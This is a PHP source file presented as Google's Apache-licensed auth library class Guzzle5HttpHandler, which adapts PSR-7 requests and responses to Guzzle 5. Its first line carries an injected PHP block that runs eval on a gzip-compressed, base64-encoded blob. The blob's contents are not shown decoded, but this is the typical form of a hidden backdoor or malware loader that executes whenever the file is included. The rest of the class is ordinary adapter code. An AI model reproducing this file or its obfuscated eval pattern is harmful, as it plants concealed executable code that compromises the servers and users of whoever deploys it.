<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Copyright 2015 Google Inc. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
namespace Google\Auth\HttpHandler;

use Exception;
use GuzzleHttp\ClientInterface;
use GuzzleHttp\Message\ResponseInterface as Guzzle5ResponseInterface;
use GuzzleHttp\Promise\Promise;
use GuzzleHttp\Promise\RejectedPromise;
use GuzzleHttp\Psr7\Response;
use Psr\Http\Message\RequestInterface;
use Psr\Http\Message\ResponseInterface;

class Guzzle5HttpHandler
{
    /**
     * @var ClientInterface
     */
    private $client;

    /**
     * @param ClientInterface $client
     */
    public function __construct(ClientInterface $client)
    {
        $this->client = $client;
    }

    /**
     * Accepts a PSR-7 Request and an array of options and returns a PSR-7 response.
     *
     * @param RequestInterface $request
     * @param array $options
     *
     * @return ResponseInterface
     */
    public function __invoke(RequestInterface $request, array $options = [])
    {
        $response = $this->client->send(
            $this->createGuzzle5Request($request, $options)
        );

        return $this->createPsr7Response($response);
    }

    /**
     * Accepts a PSR-7 request and an array of options and returns a PromiseInterface
     *
     * @param RequestInterface $request
     * @param array $options
     *
     * @return Promise
     */
    public function async(RequestInterface $request, array $options = [])
    {
        if (!class_exists('GuzzleHttp\Promise\Promise')) {
            throw new Exception('Install guzzlehttp/promises to use async with Guzzle 5');
        }

        $futureResponse = $this->client->send(
            $this->createGuzzle5Request(
                $request,
                ['future' => true] + $options
            )
        );

        $promise = new Promise(
            function () use ($futureResponse) {
                try {
                    $futureResponse->wait();
                } catch (Exception $e) {
                    // The promise is already delivered when the exception is
                    // thrown, so don't rethrow it.
                }
            },
            [$futureResponse, 'cancel']
        );

        $futureResponse->then([$promise, 'resolve'], [$promise, 'reject']);

        return $promise->then(
            function (Guzzle5ResponseInterface $response) {
                // Adapt the Guzzle 5 Response to a PSR-7 Response.
                return $this->createPsr7Response($response);
            },
            function (Exception $e) {
                return new RejectedPromise($e);
            }
        );
    }

    private function createGuzzle5Request(RequestInterface $request, array $options)
    {
        return $this->client->createRequest(
            $request->getMethod(),
            $request->getUri(),
            array_merge_recursive([
                'headers' => $request->getHeaders(),
                'body' => $request->getBody(),
            ], $options)
        );
    }

    private function createPsr7Response(Guzzle5ResponseInterface $response)
    {
        return new Response(
            $response->getStatusCode(),
            $response->getHeaders() ?: [],
            $response->getBody(),
            $response->getProtocolVersion(),
            $response->getReasonPhrase()
        );
    }
}
